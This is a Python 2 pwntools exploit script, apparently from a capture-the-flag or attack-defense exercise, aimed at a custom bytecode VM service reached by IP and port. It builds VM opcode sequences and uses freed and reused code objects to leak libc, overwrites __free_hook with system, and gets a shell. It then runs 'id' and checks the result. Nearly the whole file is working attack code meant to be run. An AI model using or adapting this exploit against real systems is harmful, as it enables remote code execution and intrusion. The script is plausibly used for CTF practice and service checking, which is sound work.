#!/usr/bin/python2.7
# coding:utf-8
# eg: python exp.py 192.168.8.101 8888
from pwn import *
import struct
import types


def p8(hi4, lo4):
    return struct.pack('<B', (hi4 << 4 | lo4) & 0xff)


class OpCode(object):
    def size(self):
        return 0

    def asm(self):
        return b''


class Loadi(OpCode):
    def __init__(self, reg, inst):
        self.reg = reg
        self.inst = p64(inst)

    def size(self):
        return 9

    def asm(self):
        return p8(0, self.reg) + self.inst


class Reg:
    R0 = 0
    R1 = 1
    R2 = 2
    R3 = 3
    R4 = 4
    R5 = 5
    R6 = 6
    R7 = 7
    R8 = 8
    R9 = 9
    R10 = 10
    R11 = 11
    R12 = 12
    BP = 13
    SP = 14
    PC = 15


class SLSize:
    Byte = 0
    Word = 1
    DWord = 2
    QWord = 3


class BranchType:
    NoCond = 0
    Equal = 1
    NotEqual = 2
    Great = 3
    Less = 4
    GreatEqual = 5
    LessEqual = 6


class SLOpCode(OpCode):
    op = 0

    def __init__(self, size, target, offsetreg=15, offset=b'\x00\x00\x00\x00'):
        self.slsize = size
        self.target = target
        self.offsetreg = offsetreg
        self.offset = offset

    def size(self):
        return 6

    def asm(self):
        return p8(self.op, self.slsize) + p8(self.target, self.offsetreg) + self.offset


class OpCode1Reg(OpCode):
    op = 0

    def __init__(self, target):
        self.target = target

    def size(self):
        return 1

    def asm(self):
        return p8(self.op, self.target)


class OpCode3Reg(OpCode):
    op = 0

    def __init__(self, target, reg1, reg2):
        self.target = target
        self.reg1 = reg1
        self.reg2 = reg2
        super(OpCode3Reg, self).__init__()

    def size(self):
        return 2

    def asm(self):
        return p8(self.op, self.target) + p8(self.reg1, self.reg2)


class OpCode2Reg(OpCode3Reg):
    def __init__(self, reg1, reg2):
        super(OpCode2Reg, self).__init__(reg1, reg2, 0)


class Load(SLOpCode):
    op = 1


class Save(SLOpCode):
    op = 2


class Mov(OpCode2Reg):
    op = 3


class Add(OpCode3Reg):
    op = 4


class Sub(OpCode3Reg):
    op = 5


class And(OpCode3Reg):
    op = 6


class Or(OpCode3Reg):
    op = 7


class Xor(OpCode3Reg):
    op = 8


class Not(OpCode2Reg):
    op = 9


class Push(OpCode1Reg):
    op = 10


class Pop(OpCode1Reg):
    op = 11


class Call(OpCode1Reg):
    op = 12


class Ret(OpCode1Reg):
    op = 13


class Cmp(OpCode2Reg):
    op = 14


class Branch(OpCode):
    def __init__(self, type, offset=b'\x00\x00\x00\x00'):
        self.type = type
        self.offset = offset

    def size(self):
        return 5

    def asm(self):
        return p8(15, self.type) + self.offset


class OpList:
    class _Data(OpCode):
        def __init__(self, data):
            self.data = data

        def size(self):
            return len(self.data)

        def asm(self):
            return self.data

    class _Offset(OpCode):
        def __init__(self, label_from, label_to):
            self.label1 = label_from
            self.label2 = label_to
            self.offset = 0

        def size(self):
            return 4

        def calc(self, opcodes, labels):
            my_pos = sum(
                map(lambda x: x.size(), opcodes[:labels[self.label1]]))
            target_pos = sum(
                map(lambda x: x.size(), opcodes[:labels[self.label2]]))
            self.offset = struct.pack('<i', target_pos - my_pos)

        def asm(self):
            return self.offset

    def __init__(self):
        self.opcodes = []
        self.label = {}

    def offset(self, lable_from, lable_to, label, neg=False):
        self.label[label] = len(self.opcodes)
        if neg:
            self.opcodes.append(self._Offset(lable_from, lable_to))
        else:
            self.opcodes.append(self._Offset(lable_to, lable_from))
        return self

    def data(self, byte, label):
        self.label[label] = len(self.opcodes)
        self.opcodes.append(self._Data(byte))
        return self

    def op(self, opcode, label=None):
        if label != None:
            self.label[label] = len(self.opcodes)
        self.opcodes.append(opcode)
        return self

    def op_loffset(self, opcode, label):
        my_index = len(self.opcodes)

        def calc_offset(self, opcodes, labels):
            my_pos = sum(map(lambda x: x.size(), opcodes[:my_index]))
            target_pos = sum(
                map(lambda x: x.size(), opcodes[:labels[label]]))
            self.offset = struct.pack('<i', target_pos - my_pos)

        opcode.calc = types.MethodType(calc_offset, opcode)
        self.opcodes.append(opcode)
        return self

    def asm(self):
        def process(x):
            if hasattr(x, 'calc'):
                x.calc(self.opcodes, self.label)
            result = x.asm()
            return result

        return b''.join(map(process, self.opcodes))

    def get_start_addr(self, startlabel):
        return sum(map(lambda x: x.size(), self.opcodes[:self.label[startlabel]]))


def offset(v):
    return struct.pack('<i', v)


def createop(io, oplist, start):
    code = oplist.asm()
    create(io, code, len(code), oplist.get_start_addr(start))


def create(io, code, length, start_addr):
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.sendline("1")
    io.recvuntil(":")
    io.send(str(length))
    io.recv()
    io.send(code)
    io.recv()
    io.sendline(str(start_addr))


def remove(io, fid):
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(fid))


def run(io, fid):
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(fid))


def helloworldcode():
    hw = OpList()
    hw.data(b'hello world\x00', 'strhw')
    hw.data(b'\x00'*0x20, 'p')
    hw.offset('getpc1', 'strhw', 'off1')
    hw.op(Mov(Reg.R0, Reg.PC), 'getpc1')
    hw.op_loffset(Load(SLSize.DWord, Reg.R1), 'off1')
    hw.op(Sub(Reg.R0, Reg.R0, Reg.R1))
    hw.op(Ret(Reg.R0))
    return hw


def return_addrcode():  # ret2 114+48
    hw = OpList()
    hw.data(b'deadbeef', 'strhw')  # fd 8byte
    hw.data(b'\x00'*0x20, 'p')  # padding 32byte
    hw.offset('getpc1', 'strhw', 'off1')  # 8byte
    # padding for ret to this function
    for i in range(114 // 2):
        # 指令为2byte 每个byte都是一样的 保证即使跳到两个指令中间 也能正常解读
        hw.op(Add(Reg.R0, Add.op, Reg.R0))
    hw.op(Push(Reg.R0))  # 这个长度是1byte 可以防止random_offset是奇数情况

    hw.op(Mov(Reg.R0, Reg.PC), 'getpc1')
    hw.op_loffset(Load(SLSize.DWord, Reg.R1), 'off1')
    hw.op(Sub(Reg.R0, Reg.R0, Reg.R1))
    hw.op(Ret(Reg.R0))

    return hw


def ret2func_code(funcid, offset):  # addr on R0
    hw = OpList()
    hw.data(b"\n","padding")
    hw.offset('start', 'real_start', 'off1',True)
    # 伪造栈
    # PC
    hw.op(Mov(Reg.R0, Reg.PC), 'start')
    hw.op_loffset(Load(SLSize.DWord, Reg.R1), 'off1')
    hw.op(Add(Reg.R0, Reg.R0, Reg.R1))
    hw.op(Push(Reg.R0))
    # Old Old BP
    hw.op(Push(Reg.BP))
    hw.op(Mov(Reg.R1, Reg.SP))
    # ret2func PC
    hw.op(Loadi(Reg.R0, (funcid << 60 | 0x0200000000000000) + offset))
    hw.op(Push(Reg.R0))
    # Old BP
    hw.op(Push(Reg.R1))
    # 移动 BP
    hw.op(Mov(Reg.BP, Reg.SP))
    # ret2func
    hw.op(Ret(Reg.R0))
    # 正常的内容
    hw.op(Pop(Reg.R0), 'real_start')
    return hw


context.log_level = 'critical'


def getshell(ip, port):
    io = remote(ip, port)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(base_dir, "libc-2.27.so")

    hw = return_addrcode()
    hw.data(b'\x00'*0x400, 'padding')
    createop(io, hw, 'getpc1')  # 0

    t = ret2func_code(0, 114+48)
    t.op(Ret(Reg.R0))
    createop(io, t, 'start')  # 1
    remove(io, 0)
    run(io, 1)
    io.recvline()
    libc_base = u64(io.recvline().strip().ljust(8,'\x00'))- 4111520
    libc = ELF(file_path)
    edit = ret2func_code(3, 114+48)

    edit.op(Loadi(Reg.R1, libc.symbols['__free_hook'] - 8 + libc_base))
    edit.op(Save(SLSize.QWord, Reg.R1, Reg.R0))
    edit.op(Ret(Reg.R0))
    createop(io, edit, "start")  # 2
    victim = return_addrcode()
    createop(io, victim, 'getpc1') # 3 
    remove(io, 3)
    run(io, 2)  # edit
    createop(io, victim, 'getpc1') # 4
    
    create(io, ('/bin/sh\x00' +
                p64(libc.symbols['system']+libc_base)).ljust(170, '\x00'), 170, 0)  # 5
    remove(io, 5)

    io.sendline("id")
    io.recvline()
    result = io.recvline()
    io.close()
    return result


if __name__ == '__main__':
    try:
        ip = sys.argv[1]
        port = sys.argv[2]
        if "nana" in getshell(ip, port):
            print '(1, ok)'
        else:
            print '(0, fail)'
    except:
        print '(0, except)'
